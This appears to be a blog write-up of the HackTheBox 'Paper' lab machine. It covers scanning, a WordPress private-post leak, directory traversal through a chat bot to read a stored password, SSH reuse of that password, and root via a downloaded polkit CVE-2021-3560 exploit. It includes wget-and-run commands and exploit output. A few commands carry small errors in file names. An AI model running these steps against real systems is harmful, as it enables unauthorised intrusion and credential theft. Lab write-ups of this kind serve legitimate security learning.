---
created: 2022-06-13
title: "Paper | HackTheBox"
description: "My Writeup for Paper box from HackTheBox"
layout: post
tags: [HackTheBox]
category: [Cybersecurity]
image:
    path: /assets/img/security/late.png
---

<br>
<div align="center">

بسم الله الرحمن الرحيم <br> احييكم بتحية الإسلام السلام عليكم ورحمة الله تعالى وبركاته

</div>
<br>

Hi folks, Hossam aka 0xGhazy is here :)

in this blog, I'll explain how to exploit [Paper](https://app.hackthebox.com/machines/Paper). It's an easy Linux machine. machine by [secnigma](https://app.hackthebox.com/users/92926) if you wanna watch my walkthrough rather than writeup you can check my Youtube video.

## Table of content:

1. Enumeration
2. Gain Access
3. Privilege Escalation
4. Conclusion
5. What I have learned from this machine?

let's start now and Hack this machine :)

# [+] Enumeration

## Nmap

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo nmap -T4 -p- 10.10.11.143
```

I used -p- switch to check all open TCP ports, and I get two open ports (22, 80, 443). Then I'll use -sC and -sV to get the result of default scripts and services versions respectively.

It's important to save your scan result because you may need it in the future, maybe you will be stuck at any point but when you take a deep breath and look again at the scan result you'll find a new way to continue in the machine or your bug bounty program. so I used -oN a switch to save the result in FullPaperNmapScan.txt file.

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo nmap -T4 -sC -sV 10.10.11.143 -oN FullPaperNmapScan.txt

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 04:55 EDT
Nmap scan report for office.paper (10.10.11.143)
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: Blunder Tiffin Inc. – The best paper company in the elec...
|_http-generator: WordPress 5.2.3
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
```

![](https://user-images.githubusercontent.com/60070427/158586960-8850caf3-ea2a-416e-98c8-4dbd4d7fd858.png)

I tried to navigate to the target but found nothing useful there also using gobuster will produce nothing. so I tried to use `Nikto` a tool for enum this application.

## Nikto

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ nikto -h 10.10.11.143
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-03-16 05:05:10 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-03-16 05:21:45 (GMT-4) (995 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I found that office.paper domain at x-backend-server section. so we need to add this domain to our hosts file using the following command.

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo echo "10.10.11.143     office.paper" >> /etc/hosts
```

By navigating to the application we will find what there is an important post/hint "Felling Alone!".

![](https://user-images.githubusercontent.com/60070427/158587774-c4f9f147-5bba-40ee-a23c-59700ce5cb78.png)

there is hidden content in the blog. and it is powered by WordPress so I'll scan it using wpscan tool.

## wpscan

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ wpscan --url http://office.paper/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Wed Mar 16 05:18:55 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <======================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Mar 16 05:19:10 2022
[+] Requests Done: 169
[+] Cached Requests: 5
[+] Data Sent: 41.802 KB
[+] Data Received: 167.972 KB
[+] Memory used: 276.699 MB
[+] Elapsed time: 00:00:14
```

our target using an outdated version of WordPress. I searched for an exploit for this version and I found this result.

![](https://user-images.githubusercontent.com/60070427/158589365-119c1743-5591-45c3-acf0-2333218f0c13.png)

We will use WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts the exploit.

to see the secret content, our link will be like this: http://office.paper/?static=1/2021/06/19/feeling-alone/ and we find it :)

![](https://user-images.githubusercontent.com/60070427/158590428-fd8df660-2ccd-4c64-933e-5e0bb72acefe.png)

We find an interesting link:http://chat.office.paper/register/8qozr226AhkCHZdyY so we need to add the new domain to our host's file

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ sudo echo "10.10.11.143     chat.office.paper" >> /etc/hosts
```

now we can go and visit this link and we will find a registration form, and we will create an account there.

![](https://user-images.githubusercontent.com/60070427/158590887-8b10cb65-c560-4d39-818a-d8739b620241.png)

After registration, we wait for 1 minute and we will be added to a general chat. and we will find a bot called recyclops that provides us with some commands to ask. file = cat command and list = ls.

so we can text him and try to get some useful information.

![](https://user-images.githubusercontent.com/60070427/158606084-af331e3d-c15a-404c-9d02-02c05d467ea2.png)

After trying to list all available files it contains nothing useful so I try the Directory traversal concept by using list ../../ and it's valid in our machine :).

![](https://user-images.githubusercontent.com/60070427/158606081-9d1e451e-0a0e-4779-bd56-d2a05b7c6c20.png)

Now we know a username dwight on the paper machine, Let's try to get more valuable information.

![](https://user-images.githubusercontent.com/60070427/158606075-3ee293de-443e-4262-9810-3caf2ade6051.png)

I found an interesting directory hubot which may be the home directory for the recyclops bot. so I tried to view its content and I found that valuable information in the .env hidden file.

![](https://user-images.githubusercontent.com/60070427/158606072-ac927b95-0ddb-4651-a4ae-f78ee20319e1.png)

![](https://user-images.githubusercontent.com/60070427/158606066-4f87fe61-3481-4fcc-a971-f288335b7321.png)

And finally, we get a password maybe-I'm from the future and I wanna say it's actually valid :)- it's valid in SSH. let's try to gain access to this machine 😎.

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ ssh dwight@office.paper
The authenticity of host 'office.paper (10.10.11.143)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'office.paper' (ED25519) to the list of known hosts.
dwight@office.paper's password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Wed Mar 16 06:12:29 2022 from 10.10.14.66
[dwight@paper ~]$ whoami
dwight
```

![](https://media.giphy.com/media/Sti3xU9WslS95nIoox/giphy.gif)

Now let's try to read the user.txt file to get the user flag.

```bash
[dwight@paper ~]$ ls -la
total 808
drwx------  12 dwight dwight   4096 Mar 16 05:58 .
drwxr-xr-x.  3 root   root       20 Mar 16 06:02 ..
lrwxrwxrwx   1 dwight dwight      9 Jul  3  2021 .bash_history -> /dev/null
-rw-r--r--   1 dwight dwight     18 May 10  2019 .bash_logout
-rw-r--r--   1 dwight dwight    141 May 10  2019 .bash_profile
-rw-r--r--   1 dwight dwight    358 Jul  3  2021 .bashrc
-rwxr-xr-x   1 dwight dwight   1174 Sep 16 06:58 bot_restart.sh
drwx------   5 dwight dwight     56 Jul  3  2021 .config
-rw-------   1 dwight dwight     18 Mar 16 05:20 .dbshell
-rw-------   1 dwight dwight     16 Jul  3  2021 .esd_auth
drwx------   3 dwight dwight     69 Mar 16 06:16 .gnupg
drwx------   8 dwight dwight   4096 Sep 16 07:57 hubot
-rw-rw-r--   1 dwight dwight     18 Sep 16 07:24 .hubot_history
-rw-rw-r--   1 dwight dwight    499 Mar 16 05:29 index.html
drwx------   3 dwight dwight     19 Jul  3  2021 .local
drwxr-xr-x   4 dwight dwight     39 Jul  3  2021 .mozilla
drwxrwxr-x   5 dwight dwight     83 Jul  3  2021 .npm
drwxr-xr-x   4 dwight dwight     32 Jul  3  2021 sales
drwx------   2 dwight dwight      6 Sep 16 08:56 .ssh
-r--------   1 dwight dwight     33 Mar 16 04:34 user.txt
drwxr-xr-x   2 dwight dwight     24 Sep 16 07:09 .vim
[dwight@paper ~]$ cat user.txt
XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx
```

# [+] Privilege Escalation

We have a user and need to get a root flag. if we try sudo -l we will get nothing useful.

so I'll try `linpeas.sh`. we send this script by scp command. First download linpeas script.

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220314/linpeas.sh

┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ scp linpeas.sh dwight@office.paper:/home/dwight
```

Then connect to it again and change its permissions if needed via SSH

```bash
[dwight@paper ~]$ chmod 777 lianpeas.sh
[dwight@paper ~]$ ./lianpeas.sh
```

![](https://user-images.githubusercontent.com/60070427/158610090-44cc4469-9154-460c-86b5-1585e1117f1d.png)

We will find that our target is vulnerable to CVE-2021-3560.

you can use this Python script or you can use the bash script in the Auther GitHub account "It all about enum :)".

![](https://user-images.githubusercontent.com/60070427/158610542-70c00f25-7cb4-41a9-942d-4988f297a096.PNG)

In my case, I'll use the Python script above by sending it to the target machine by scp or using wget.

```bash
[dwight@paper ~]$ wget https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
[dwight@paper ~]$ python3 poc.py
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit
[+] User Created with the name of ahmed
[+] Timed out at: 0.006322452546498194
[+] Timed out at: 0.007741276567260387
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root
bash: cannot set terminal process group (225477): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight]# cd /root
[root@paper ~]# ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
[root@paper ~]# cat root.txt
RootRootRootRootRootRootRootRoot
```

# [+] Conclusion

First, we start with Nmap and find that we have open ports such as 80, 22, 443. if we try to gobuster our target we won't find any useful information and we'll be stuck there for a while. then I try Nikto to enum our target and I found office.paper the domain. and it's powered by WordPress so we'll scan it using wpscan and we'll get that our target using an outdated version that has a known exploit on the exploit database. then we get the hidden content of this blog and it helps us to reach the recyclops bot we use its functionality to gain more information from the server using directory traversal. to get the username and password from .env the file. and use this data to connect via SSH and scan our target using linpeas and get that our target is vulnerable to known CVE PolKit and we use this exploit to gain root access and submit the flag.

# [+] What i have learned from this machine?

- Try harder in the Enumeration stage.
- Take notes and save your scan results.
- If you are stuck read Machine forum for some help and hints such as:

![](https://user-images.githubusercontent.com/60070427/158615454-6924a926-2cc9-46d8-84e2-d1dd1bb7f4e4.PNG)

![](https://user-images.githubusercontent.com/60070427/158615460-c6b8fae7-da65-4989-8e6f-f86fca332b92.PNG)

![](https://user-images.githubusercontent.com/60070427/158615457-0fd08378-bd73-4157-a239-c8577961d161.PNG)

Another important note, using linpeas won't make you a hacker. I used it because I'm a noob and it's my first machine - actually it's my first complete machine :)-. it's useful to try all possible techniques manually.

In conclusion, I will be happy if you liked the article and benefited from it, and I hope that you will share it with your friends who are interested in these articles and recommend it to them. Thank you for your time ❤
